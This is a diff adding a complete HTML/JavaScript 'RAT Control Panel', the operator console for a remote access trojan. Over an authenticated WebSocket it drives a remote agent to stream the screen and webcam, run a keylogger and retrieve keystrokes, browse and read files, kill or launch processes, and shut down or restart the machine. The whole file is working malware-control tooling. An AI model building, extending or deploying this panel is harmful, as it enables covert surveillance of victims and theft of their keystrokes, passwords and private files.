@@ -1,0 +1,1007 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RAT Control Panel</title>
+<style>
+  /* ── Design tokens ───────────────────────────────────────── */
+  :root {
+    --bg:        #0d0f14;
+    --surface:   #141720;
+    --surface2:  #1c2030;
+    --border:    #252a3a;
+    --accent:    #00e5ff;
+    --accent2:   #7b61ff;
+    --danger:    #ff4757;
+    --warn:      #ffa502;
+    --ok:        #2ed573;
+    --text:      #c8d0e8;
+    --text-dim:  #5a6480;
+    --mono:      'JetBrains Mono', 'Fira Code', monospace;
+    --sans:      'Inter', system-ui, sans-serif;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { font-size: 13px; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    gap: 0;
+  }
+
+  /* ── Top bar ─────────────────────────────────────────────── */
+  #topbar {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: 10px 18px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    flex-wrap: wrap;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+
+  #topbar .brand {
+    font-family: var(--mono);
+    font-size: 1.1rem;
+    color: var(--accent);
+    letter-spacing: .12em;
+    white-space: nowrap;
+    margin-right: 8px;
+  }
+
+  #topbar input {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: .9rem;
+    padding: 6px 10px;
+    border-radius: 4px;
+    outline: none;
+    transition: border-color .2s;
+  }
+  #topbar input:focus { border-color: var(--accent); }
+  #url-input { width: 220px; }
+  #token-input { width: 260px; letter-spacing: .06em; }
+
+  #status-dot {
+    width: 10px; height: 10px;
+    border-radius: 50%;
+    background: var(--text-dim);
+    flex-shrink: 0;
+    transition: background .3s, box-shadow .3s;
+  }
+  #status-dot.connected { background: var(--ok); box-shadow: 0 0 8px var(--ok); }
+  #status-dot.connecting { background: var(--warn); box-shadow: 0 0 8px var(--warn); animation: pulse 1s infinite; }
+  #status-dot.error { background: var(--danger); box-shadow: 0 0 8px var(--danger); }
+
+  @keyframes pulse { 50% { opacity: .4; } }
+
+  #status-label {
+    font-family: var(--mono);
+    font-size: .8rem;
+    color: var(--text-dim);
+    min-width: 110px;
+  }
+
+  /* ── Buttons ─────────────────────────────────────────────── */
+  button {
+    cursor: pointer;
+    font-family: var(--sans);
+    font-size: .82rem;
+    font-weight: 600;
+    padding: 6px 13px;
+    border-radius: 4px;
+    border: 1px solid transparent;
+    transition: all .15s;
+    white-space: nowrap;
+  }
+  .btn-primary { background: var(--accent); color: #000; border-color: var(--accent); }
+  .btn-primary:hover { filter: brightness(1.2); }
+  .btn-danger  { background: transparent; color: var(--danger); border-color: var(--danger); }
+  .btn-danger:hover { background: var(--danger); color: #fff; }
+  .btn-ghost   { background: transparent; color: var(--text); border-color: var(--border); }
+  .btn-ghost:hover { border-color: var(--accent); color: var(--accent); }
+  .btn-warn    { background: transparent; color: var(--warn); border-color: var(--warn); }
+  .btn-warn:hover { background: var(--warn); color: #000; }
+  .btn-ok      { background: transparent; color: var(--ok); border-color: var(--ok); }
+  .btn-ok:hover { background: var(--ok); color: #000; }
+  .btn-sm { padding: 3px 8px; font-size: .75rem; }
+  button:disabled { opacity: .35; cursor: not-allowed; }
+
+  /* ── Main layout ─────────────────────────────────────────── */
+  #main {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    grid-template-rows: auto auto auto;
+    gap: 1px;
+    background: var(--border);
+    flex: 1;
+  }
+
+  .panel {
+    background: var(--surface);
+    padding: 16px;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    min-height: 260px;
+  }
+
+  .panel-full { grid-column: 1 / -1; }
+
+  .panel-title {
+    font-size: .7rem;
+    font-family: var(--mono);
+    letter-spacing: .18em;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .panel-title::before {
+    content: '';
+    width: 3px; height: 12px;
+    border-radius: 2px;
+  }
+  .panel-title.stream::before  { background: var(--accent); }
+  .panel-title.process::before { background: var(--accent2); }
+  .panel-title.files::before   { background: var(--ok); }
+  .panel-title.system::before  { background: var(--warn); }
+  .panel-title.log::before     { background: var(--text-dim); }
+
+  /* ── Stream panel ────────────────────────────────────────── */
+  .stream-controls { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
+
+  .stream-viewers {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px;
+    flex: 1;
+  }
+
+  .stream-box {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 180px;
+    position: relative;
+  }
+
+  .stream-box img {
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+    display: block;
+  }
+
+  .stream-box .placeholder {
+    color: var(--text-dim);
+    font-family: var(--mono);
+    font-size: .75rem;
+    text-align: center;
+    padding: 12px;
+  }
+
+  .stream-label {
+    position: absolute;
+    top: 6px; left: 8px;
+    font-family: var(--mono);
+    font-size: .65rem;
+    color: var(--accent);
+    background: rgba(0,0,0,.6);
+    padding: 2px 6px;
+    border-radius: 3px;
+  }
+
+  .fps-badge {
+    position: absolute;
+    top: 6px; right: 8px;
+    font-family: var(--mono);
+    font-size: .65rem;
+    color: var(--ok);
+    background: rgba(0,0,0,.6);
+    padding: 2px 6px;
+    border-radius: 3px;
+    display: none;
+  }
+
+  /* ── Process panel ───────────────────────────────────────── */
+  .proc-toolbar { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
+
+  #proc-search {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: .8rem;
+    padding: 5px 9px;
+    border-radius: 4px;
+    outline: none;
+    width: 180px;
+    transition: border-color .2s;
+  }
+  #proc-search:focus { border-color: var(--accent2); }
+
+  .proc-table-wrap { overflow-y: auto; max-height: 240px; flex: 1; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: .78rem;
+  }
+
+  thead th {
+    background: var(--surface2);
+    color: var(--text-dim);
+    font-family: var(--mono);
+    font-size: .7rem;
+    text-align: left;
+    padding: 6px 8px;
+    position: sticky; top: 0;
+    border-bottom: 1px solid var(--border);
+  }
+
+  tbody tr:hover { background: var(--surface2); }
+
+  td {
+    padding: 5px 8px;
+    border-bottom: 1px solid rgba(37,42,58,.6);
+    font-family: var(--mono);
+    vertical-align: middle;
+  }
+
+  .gui-badge {
+    font-size: .65rem;
+    padding: 1px 5px;
+    border-radius: 2px;
+    background: rgba(0,229,255,.12);
+    color: var(--accent);
+  }
+
+  .cpu-bar {
+    display: inline-block;
+    height: 6px;
+    border-radius: 3px;
+    background: var(--accent2);
+    min-width: 2px;
+    max-width: 60px;
+    vertical-align: middle;
+    margin-right: 4px;
+  }
+
+  /* ── Files panel ─────────────────────────────────────────── */
+  .file-toolbar { display: flex; gap: 8px; align-items: center; }
+
+  #file-path-input {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: .8rem;
+    padding: 5px 9px;
+    border-radius: 4px;
+    outline: none;
+    flex: 1;
+    transition: border-color .2s;
+  }
+  #file-path-input:focus { border-color: var(--ok); }
+
+  .file-list { overflow-y: auto; max-height: 180px; flex: 1; }
+
+  .file-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 5px 8px;
+    border-bottom: 1px solid rgba(37,42,58,.5);
+    font-family: var(--mono);
+    font-size: .78rem;
+  }
+  .file-item:hover { background: var(--surface2); }
+
+  /* file content viewer */
+  #file-content-box {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 10px;
+    font-family: var(--mono);
+    font-size: .75rem;
+    color: var(--ok);
+    white-space: pre-wrap;
+    word-break: break-all;
+    max-height: 120px;
+    overflow-y: auto;
+    display: none;
+  }
+
+  /* ── System panel ────────────────────────────────────────── */
+  .metrics-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 8px;
+  }
+
+  .metric-card {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 10px 14px;
+  }
+  .metric-label { font-size: .65rem; color: var(--text-dim); font-family: var(--mono); letter-spacing: .1em; }
+  .metric-value { font-size: 1.4rem; font-family: var(--mono); color: var(--accent); margin-top: 2px; }
+
+  .sys-controls { display: flex; gap: 8px; flex-wrap: wrap; }
+
+  .keylogger-out {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 8px;
+    font-family: var(--mono);
+    font-size: .78rem;
+    color: var(--warn);
+    min-height: 50px;
+    max-height: 80px;
+    overflow-y: auto;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+
+  /* ── Log console ─────────────────────────────────────────── */
+  #log-panel {
+    grid-column: 1 / -1;
+    min-height: 160px;
+    max-height: 220px;
+  }
+
+  #log-output {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 10px;
+    font-family: var(--mono);
+    font-size: .72rem;
+    overflow-y: auto;
+    flex: 1;
+    max-height: 140px;
+  }
+
+  .log-entry { padding: 2px 0; line-height: 1.5; border-bottom: 1px solid rgba(37,42,58,.3); }
+  .log-entry .ts { color: var(--text-dim); margin-right: 6px; }
+  .log-entry.sent .dir { color: var(--accent2); }
+  .log-entry.recv .dir { color: var(--ok); }
+  .log-entry.err .dir  { color: var(--danger); }
+  .log-entry.info .dir { color: var(--warn); }
+  .log-json { color: var(--text); }
+
+  .log-toolbar { display: flex; gap: 8px; align-items: center; }
+
+  /* ── App launch bar ──────────────────────────────────────── */
+  .launch-bar { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
+  #app-name-input {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: .8rem;
+    padding: 5px 9px;
+    border-radius: 4px;
+    outline: none;
+    width: 140px;
+    transition: border-color .2s;
+  }
+  #app-name-input:focus { border-color: var(--accent2); }
+
+  /* ── Camera index ────────────────────────────────────────── */
+  #cam-index {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: .8rem;
+    padding: 5px 6px;
+    border-radius: 4px;
+    outline: none;
+    width: 50px;
+  }
+
+  /* ── Scrollbar ───────────────────────────────────────────── */
+  ::-webkit-scrollbar { width: 5px; height: 5px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+
+  /* ── Divider ─────────────────────────────────────────────── */
+  .sep { border: none; border-top: 1px solid var(--border); margin: 2px 0; }
+
+  @media (max-width: 760px) {
+    #main { grid-template-columns: 1fr; }
+    .stream-viewers { grid-template-columns: 1fr; }
+    #url-input { width: 150px; }
+    #token-input { width: 180px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ── Top Bar ───────────────────────────────────────────────────── -->
+<div id="topbar">
+  <span class="brand">RAT//CP</span>
+  <input id="url-input"   type="text" placeholder="ws://192.168.x.x:8765" value="ws://127.0.0.1:8765">
+  <input id="token-input" type="password" placeholder="Gateway token">
+  <button id="connect-btn" class="btn-primary" onclick="toggleConnect()">Connect</button>
+  <div id="status-dot"></div>
+  <span id="status-label">Disconnected</span>
+</div>
+
+<!-- ── Main Grid ─────────────────────────────────────────────────── -->
+<div id="main">
+
+  <!-- ── Stream Panel ──────────────────────────────────────────── -->
+  <div class="panel" style="grid-column: 1 / -1;">
+    <div class="panel-title stream">LIVE STREAM</div>
+    <div class="stream-controls">
+      <button class="btn-ghost" id="screen-stream-btn" onclick="toggleScreenStream()" disabled>▶ Screen Stream</button>
+      <button class="btn-ghost" id="webcam-stream-btn" onclick="toggleWebcamStream()" disabled>▶ Webcam Stream</button>
+      <label style="color:var(--text-dim);font-size:.8rem;">cam#</label>
+      <input id="cam-index" type="number" value="0" min="0" max="9">
+      <button class="btn-ghost btn-sm" onclick="sendCommand('screen_capture',{})" disabled id="snap-screen-btn">📷 Snap Screen</button>
+      <button class="btn-ghost btn-sm" onclick="snapWebcam()" disabled id="snap-cam-btn">📷 Snap Webcam</button>
+    </div>
+    <div class="stream-viewers">
+      <div class="stream-box" id="screen-box">
+        <span class="stream-label">SCREEN</span>
+        <span class="fps-badge" id="screen-fps"></span>
+        <div class="placeholder">— no signal —</div>
+      </div>
+      <div class="stream-box" id="webcam-box">
+        <span class="stream-label">WEBCAM</span>
+        <span class="fps-badge" id="webcam-fps"></span>
+        <div class="placeholder">— no signal —</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── Process Panel ─────────────────────────────────────────── -->
+  <div class="panel">
+    <div class="panel-title process">PROCESS MANAGER</div>
+    <div class="proc-toolbar">
+      <button class="btn-ghost" onclick="loadProcesses()" disabled id="load-proc-btn">↻ Refresh</button>
+      <input id="proc-search" type="text" placeholder="Filter by name…" oninput="filterProcesses()">
+    </div>
+    <div class="launch-bar">
+      <input id="app-name-input" type="text" placeholder="notepad / calc">
+      <button class="btn-ok btn-sm" onclick="launchApp()" disabled id="launch-btn">▶ Launch</button>
+    </div>
+    <div class="proc-table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>PID</th><th>Name</th><th>CPU%</th><th>RAM%</th><th>GUI</th><th></th>
+          </tr>
+        </thead>
+        <tbody id="proc-tbody"></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ── Files Panel ───────────────────────────────────────────── -->
+  <div class="panel">
+    <div class="panel-title files">SANDBOX FILES</div>
+    <div class="file-toolbar">
+      <input id="file-path-input" type="text" value="." placeholder="C:\RemoteWorkspace or .">
+      <button class="btn-ghost btn-sm" onclick="listFiles()" disabled id="list-files-btn">List</button>
+    </div>
+    <div class="file-list" id="file-list"></div>
+    <pre id="file-content-box"></pre>
+  </div>
+
+  <!-- ── System Panel ──────────────────────────────────────────── -->
+  <div class="panel">
+    <div class="panel-title system">SYSTEM & KEYLOGGER</div>
+    <div class="metrics-grid">
+      <div class="metric-card">
+        <div class="metric-label">RAM USAGE</div>
+        <div class="metric-value" id="ram-val">—</div>
+      </div>
+      <div class="metric-card">
+        <div class="metric-label">UPTIME</div>
+        <div class="metric-value" id="uptime-val" style="font-size:.95rem;padding-top:4px;">—</div>
+      </div>
+    </div>
+    <button class="btn-ghost btn-sm" style="align-self:start" onclick="fetchMetrics()" disabled id="metrics-btn">↻ Metrics</button>
+    <hr class="sep">
+    <div class="sys-controls">
+      <button class="btn-ghost btn-sm" onclick="powerAction('lock')"     disabled id="lock-btn">🔒 Lock</button>
+      <button class="btn-warn  btn-sm" onclick="powerAction('sleep')"    disabled id="sleep-btn">💤 Sleep</button>
+      <button class="btn-warn  btn-sm" onclick="confirmPower('restart')" disabled id="restart-btn">🔄 Restart</button>
+      <button class="btn-danger btn-sm" onclick="confirmPower('shutdown')" disabled id="shutdown-btn">⏻ Shutdown</button>
+    </div>
+    <hr class="sep">
+    <div style="display:flex;gap:8px;flex-wrap:wrap;">
+      <button class="btn-ok btn-sm"    onclick="keyloggerAction('start')" disabled id="kl-start">⏺ KL Start</button>
+      <button class="btn-ghost btn-sm" onclick="keyloggerAction('stop')"  disabled id="kl-stop">⏹ KL Stop</button>
+      <button class="btn-ghost btn-sm" onclick="keyloggerAction('get')"   disabled id="kl-get">⬇ Get Log</button>
+    </div>
+    <div class="keylogger-out" id="kl-out">— keylogger output —</div>
+  </div>
+
+  <!-- ── Log Console ────────────────────────────────────────────── -->
+  <div class="panel panel-full" id="log-panel">
+    <div class="panel-title log">
+      CONSOLE
+      <div class="log-toolbar" style="margin-left:auto;">
+        <button class="btn-ghost btn-sm" onclick="clearLog()">Clear</button>
+      </div>
+    </div>
+    <div id="log-output"></div>
+  </div>
+
+</div>
+
+<script>
+// ── State ────────────────────────────────────────────────────────
+let ws = null;
+let authenticated = false;
+let screenStreaming = false;
+let webcamStreaming = false;
+let pendingRequests = {};
+
+// FPS counters
+let screenFrames = 0, webcamFrames = 0;
+let screenFpsTs = Date.now(), webcamFpsTs = Date.now();
+
+// Process data
+let allProcesses = [];
+
+// ── WebSocket management ─────────────────────────────────────────
+function toggleConnect() {
+  if (ws && ws.readyState === WebSocket.OPEN) {
+    ws.close();
+  } else {
+    openSocket();
+  }
+}
+
+function openSocket() {
+  const url   = document.getElementById('url-input').value.trim();
+  const token = document.getElementById('token-input').value.trim();
+  if (!url || !token) { logInfo('Enter URL and token first.'); return; }
+
+  setStatus('connecting', 'Connecting…');
+  try {
+    ws = new WebSocket(url);
+  } catch (e) {
+    setStatus('error', 'Invalid URL');
+    logErr('WebSocket error: ' + e.message);
+    return;
+  }
+
+  ws.onopen = () => {
+    setStatus('connecting', 'Authenticating…');
+    const authMsg = { type: 'auth', token };
+    logSent(authMsg);
+    ws.send(JSON.stringify(authMsg));
+  };
+
+  ws.onmessage = (ev) => {
+    let msg;
+    try { msg = JSON.parse(ev.data); } catch { logErr('Bad JSON from server'); return; }
+    handleMessage(msg);
+  };
+
+  ws.onerror = () => {
+    setStatus('error', 'Connection error');
+    logErr('WebSocket connection error');
+  };
+
+  ws.onclose = (ev) => {
+    authenticated = false;
+    screenStreaming = false;
+    webcamStreaming = false;
+    screenFrames = 0; webcamFrames = 0;
+    document.getElementById('screen-fps').style.display = 'none';
+    document.getElementById('webcam-fps').style.display = 'none';
+    setStatus('', 'Disconnected');
+    setConnectBtn(false);
+    setControlsEnabled(false);
+    updateStreamButtons();
+    logInfo(`Disconnected (code ${ev.code})`);
+  };
+}
+
+function handleMessage(msg) {
+  logRecv(msg);
+
+  switch (msg.type) {
+    case 'auth_result':
+      if (msg.status === 'ok') {
+        authenticated = true;
+        setStatus('connected', 'Connected · ' + (msg.message || ''));
+        setConnectBtn(true);
+        setControlsEnabled(true);
+      } else {
+        setStatus('error', 'Auth failed');
+        logErr('Auth failed: ' + msg.message);
+        ws.close();
+      }
+      break;
+
+    case 'command_result':
+      handleCommandResult(msg);
+      break;
+
+    case 'stream_frame':
+      handleStreamFrame(msg);
+      break;
+
+    case 'stream_control_result':
+      // handled inline
+      break;
+
+    case 'pong':
+      break;
+
+    case 'error':
+      logErr('Server error: ' + msg.message);
+      break;
+  }
+}
+
+// ── Sending ──────────────────────────────────────────────────────
+let _ridCounter = 0;
+function newRid() { return 'r' + (++_ridCounter).toString(36) + Date.now().toString(36); }
+
+function send(obj) {
+  if (!ws || ws.readyState !== WebSocket.OPEN) { logErr('Not connected'); return null; }
+  logSent(obj);
+  ws.send(JSON.stringify(obj));
+  return obj.request_id || null;
+}
+
+function sendCommand(module, parameters, cb) {
+  const rid = newRid();
+  if (cb) pendingRequests[rid] = cb;
+  send({ type: 'command', request_id: rid, module, parameters: parameters || {} });
+  return rid;
+}
+
+function sendStreamControl(module, action, extra) {
+  send({ type: 'stream_control', module, action, ...extra });
+}
+
+// ── Command result dispatcher ────────────────────────────────────
+function handleCommandResult(msg) {
+  if (pendingRequests[msg.request_id]) {
+    pendingRequests[msg.request_id](msg);
+    delete pendingRequests[msg.request_id];
+    return;
+  }
+  // module routing by data shape
+  if (msg.status === 'denied') { logErr('Denied by agent user.'); return; }
+  if (msg.status === 'error')  { logErr('Error: ' + msg.message); return; }
+}
+
+// ── Stream frames ────────────────────────────────────────────────
+function handleStreamFrame(msg) {
+  const b64 = msg.data?.image_base64;
+  if (!b64) return;
+  const mimeType = msg.module === 'webcam' ? 'image/jpeg' : 'image/png';
+  const src = `data:${mimeType};base64,${b64}`;
+
+  if (msg.module === 'screen') {
+    setStreamImage('screen-box', src);
+    screenFrames++;
+    const now = Date.now();
+    if (now - screenFpsTs >= 1000) {
+      const fps = (screenFrames / ((now - screenFpsTs) / 1000)).toFixed(1);
+      const el = document.getElementById('screen-fps');
+      el.textContent = fps + ' fps'; el.style.display = 'block';
+      screenFrames = 0; screenFpsTs = now;
+    }
+  } else {
+    setStreamImage('webcam-box', src);
+    webcamFrames++;
+    const now = Date.now();
+    if (now - webcamFpsTs >= 1000) {
+      const fps = (webcamFrames / ((now - webcamFpsTs) / 1000)).toFixed(1);
+      const el = document.getElementById('webcam-fps');
+      el.textContent = fps + ' fps'; el.style.display = 'block';
+      webcamFrames = 0; webcamFpsTs = now;
+    }
+  }
+}
+
+function setStreamImage(boxId, src) {
+  const box = document.getElementById(boxId);
+  let img = box.querySelector('img');
+  if (!img) {
+    box.querySelector('.placeholder')?.remove();
+    img = document.createElement('img');
+    box.appendChild(img);
+  }
+  img.src = src;
+}
+
+// ── Screen stream ────────────────────────────────────────────────
+function toggleScreenStream() {
+  if (!screenStreaming) {
+    sendStreamControl('screen', 'start');
+    screenStreaming = true;
+  } else {
+    sendStreamControl('screen', 'stop');
+    screenStreaming = false;
+    document.getElementById('screen-fps').style.display = 'none';
+  }
+  updateStreamButtons();
+}
+
+function toggleWebcamStream() {
+  if (!webcamStreaming) {
+    const idx = parseInt(document.getElementById('cam-index').value) || 0;
+    sendStreamControl('webcam', 'start', { camera_index: idx });
+    webcamStreaming = true;
+  } else {
+    sendStreamControl('webcam', 'stop');
+    webcamStreaming = false;
+    document.getElementById('webcam-fps').style.display = 'none';
+  }
+  updateStreamButtons();
+}
+
+function updateStreamButtons() {
+  const ss = document.getElementById('screen-stream-btn');
+  const ws2 = document.getElementById('webcam-stream-btn');
+  if (ss) { ss.textContent = screenStreaming ? '⏹ Stop Screen' : '▶ Screen Stream'; }
+  if (ws2) { ws2.textContent = webcamStreaming ? '⏹ Stop Webcam' : '▶ Webcam Stream'; }
+}
+
+function snapWebcam() {
+  const idx = parseInt(document.getElementById('cam-index').value) || 0;
+  sendCommand('camera_capture', { camera_index: idx }, (msg) => {
+    if (msg.status === 'ok' || msg.status === 'success') {
+      const src = 'data:image/jpeg;base64,' + msg.data.image_base64;
+      setStreamImage('webcam-box', src);
+    }
+  });
+}
+
+// ── Process manager ──────────────────────────────────────────────
+function loadProcesses() {
+  sendCommand('list_processes', {}, (msg) => {
+    if ((msg.status === 'ok' || msg.status === 'success') && msg.data) {
+      allProcesses = msg.data;
+      renderProcesses(allProcesses);
+    } else {
+      logErr('list_processes: ' + msg.message);
+    }
+  });
+}
+
+function renderProcesses(procs) {
+  const tbody = document.getElementById('proc-tbody');
+  tbody.innerHTML = '';
+  procs.forEach(p => {
+    const tr = document.createElement('tr');
+    const cpuPct = Math.min(p.cpu || 0, 100);
+    tr.innerHTML = `
+      <td>${p.pid}</td>
+      <td>${escHtml(p.name)}</td>
+      <td><span class="cpu-bar" style="width:${cpuPct * .6}px"></span>${(p.cpu||0).toFixed(1)}%</td>
+      <td>${(p.ram||0).toFixed(1)}%</td>
+      <td>${p.gui ? '<span class="gui-badge">GUI</span>' : ''}</td>
+      <td><button class="btn-danger btn-sm" onclick="killPid(${p.pid})">Kill</button></td>
+    `;
+    tbody.appendChild(tr);
+  });
+}
+
+function filterProcesses() {
+  const q = document.getElementById('proc-search').value.toLowerCase();
+  const filtered = q ? allProcesses.filter(p => p.name.toLowerCase().includes(q)) : allProcesses;
+  renderProcesses(filtered);
+}
+
+function killPid(pid) {
+  if (!confirm(`Kill PID ${pid}?`)) return;
+  sendCommand('process_terminate', { pid }, (msg) => {
+    if (msg.status === 'ok' || msg.status === 'success') {
+      logInfo(`PID ${pid} terminated.`);
+      loadProcesses();
+    } else {
+      logErr('Kill failed: ' + msg.message);
+    }
+  });
+}
+
+function launchApp() {
+  const app = document.getElementById('app-name-input').value.trim();
+  if (!app) return;
+  sendCommand('application_launch', { application: app }, (msg) => {
+    if (msg.status === 'ok' || msg.status === 'success') {
+      logInfo(`Launched ${app} → PID ${msg.data?.pid}`);
+    } else {
+      logErr('Launch failed: ' + msg.message);
+    }
+  });
+}
+
+// ── File manager ─────────────────────────────────────────────────
+function listFiles() {
+  const path = document.getElementById('file-path-input').value.trim() || '.';
+  sendCommand('file_list', { path }, (msg) => {
+    const el = document.getElementById('file-list');
+    el.innerHTML = '';
+    if (msg.status === 'ok' || msg.status === 'success') {
+      const items = msg.data?.items || [];
+      if (!items.length) { el.innerHTML = '<div style="color:var(--text-dim);padding:8px;font-family:var(--mono);font-size:.75rem;">Empty directory</div>'; return; }
+      items.forEach(p => {
+        const div = document.createElement('div');
+        div.className = 'file-item';
+        const nameSpan = document.createElement('span');
+        nameSpan.style.fontSize = '.75rem';
+        nameSpan.textContent = p;
+        const readBtn = document.createElement('button');
+        readBtn.className = 'btn-ghost btn-sm';
+        readBtn.textContent = 'Read';
+        readBtn.addEventListener('click', () => readFile(p));
+        div.appendChild(nameSpan);
+        div.appendChild(readBtn);
+        el.appendChild(div);
+      });
+    } else {
+      logErr('file_list: ' + msg.message);
+    }
+  });
+}
+
+function readFile(path) {
+  sendCommand('file_read', { path }, (msg) => {
+    const box = document.getElementById('file-content-box');
+    if (msg.status === 'ok' || msg.status === 'success') {
+      const b64 = msg.data?.content_base64 || '';
+      try {
+        const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
+        const text = new TextDecoder('utf-8').decode(bytes);
+        box.textContent = text;
+      } catch {
+        box.textContent = b64;
+      }
+      box.style.display = 'block';
+    } else {
+      logErr('file_read: ' + msg.message);
+    }
+  });
+}
+
+// ── System metrics ───────────────────────────────────────────────
+function fetchMetrics() {
+  sendCommand('system_metrics', {}, (msg) => {
+    if (msg.status === 'ok' || msg.status === 'success') {
+      const d = msg.data || {};
+      document.getElementById('ram-val').textContent = (d.ram_usage_percent || 0).toFixed(1) + '%';
+      const secs = d.uptime_seconds || 0;
+      const h = Math.floor(secs / 3600), m = Math.floor((secs % 3600) / 60);
+      document.getElementById('uptime-val').textContent = `${h}h ${m}m`;
+    } else {
+      logErr('system_metrics: ' + msg.message);
+    }
+  });
+}
+
+// ── Power control ────────────────────────────────────────────────
+function powerAction(action) {
+  sendCommand('power_control', { action }, (msg) => {
+    logInfo(`Power ${action}: ${msg.status}`);
+  });
+}
+
+function confirmPower(action) {
+  if (confirm(`Really ${action} the remote machine?`)) powerAction(action);
+}
+
+// ── Keylogger ────────────────────────────────────────────────────
+function keyloggerAction(action) {
+  sendCommand('keylogger', { action }, (msg) => {
+    if (action === 'get') {
+      const text = msg.data?.keystrokes ?? '';
+      document.getElementById('kl-out').textContent = text || '(no keystrokes captured)';
+    } else {
+      logInfo('Keylogger ' + action + ': ' + msg.status);
+    }
+  });
+}
+
+// ── UI helpers ───────────────────────────────────────────────────
+function setStatus(cls, label) {
+  const dot = document.getElementById('status-dot');
+  dot.className = cls;
+  document.getElementById('status-label').textContent = label;
+}
+
+function setConnectBtn(connected) {
+  const btn = document.getElementById('connect-btn');
+  btn.textContent = connected ? 'Disconnect' : 'Connect';
+  btn.className = connected ? 'btn-danger' : 'btn-primary';
+}
+
+const allControlIds = [
+  'screen-stream-btn','webcam-stream-btn','snap-screen-btn','snap-cam-btn',
+  'load-proc-btn','launch-btn','list-files-btn','metrics-btn',
+  'lock-btn','sleep-btn','restart-btn','shutdown-btn',
+  'kl-start','kl-stop','kl-get'
+];
+
+function setControlsEnabled(en) {
+  allControlIds.forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.disabled = !en;
+  });
+}
+
+// ── Log console ──────────────────────────────────────────────────
+function addLog(cls, dir, content) {
+  const out = document.getElementById('log-output');
+  const d = document.createElement('div');
+  d.className = 'log-entry ' + cls;
+  const ts = new Date().toLocaleTimeString('en', { hour12: false });
+  const text = typeof content === 'object' ? JSON.stringify(content) : content;
+  d.innerHTML = `<span class="ts">${ts}</span><span class="dir">${dir}</span> <span class="log-json">${escHtml(text)}</span>`;
+  out.appendChild(d);
+  out.scrollTop = out.scrollHeight;
+}
+
+function logSent(msg) {
+  // Skip logging stream frames to avoid flooding
+  if (msg.type === 'stream_frame') return;
+  addLog('sent', '↑ SEND', msg);
+}
+function logRecv(msg) {
+  if (msg.type === 'stream_frame') return;
+  addLog('recv', '↓ RECV', msg);
+}
+function logErr(msg)  { addLog('err',  '✕ ERR ', msg); }
+function logInfo(msg) { addLog('info', '· INFO', msg); }
+function clearLog()   { document.getElementById('log-output').innerHTML = ''; }
+
+// ── Keepalive ping ───────────────────────────────────────────────
+setInterval(() => {
+  if (ws && ws.readyState === WebSocket.OPEN && authenticated) {
+    ws.send(JSON.stringify({ type: 'ping' }));
+  }
+}, 20000);
+
+// ── Snap screen shortcut ─────────────────────────────────────────
+document.getElementById('snap-screen-btn').onclick = () => {
+  sendCommand('screen_capture', {}, (msg) => {
+    if (msg.status === 'ok' || msg.status === 'success') {
+      const src = 'data:image/png;base64,' + msg.data.image_base64;
+      setStreamImage('screen-box', src);
+    }
+  });
+};
+
+// ── Sanitize ─────────────────────────────────────────────────────
+function escHtml(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+</script>
+</body>
+</html>
